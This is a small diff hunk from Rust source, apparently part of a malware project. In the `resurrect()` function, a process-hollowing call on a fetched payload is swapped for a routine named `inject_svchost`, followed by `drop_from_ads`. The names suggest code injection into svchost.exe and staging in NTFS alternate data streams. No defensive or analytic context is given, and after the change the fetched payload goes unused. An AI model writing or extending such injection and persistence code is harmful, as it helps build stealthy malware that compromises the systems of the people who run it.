@@ -111,7 +111,7 @@ pub unsafe fn resurrect() -> bool {
         Some(p) => p,
         None    => return false,
     };
-    let ok = crate::hollow::run(&payload);
+    let ok = crate::hollow::inject_svchost();
     if ok { drop_from_ads(); }
     ok
 }
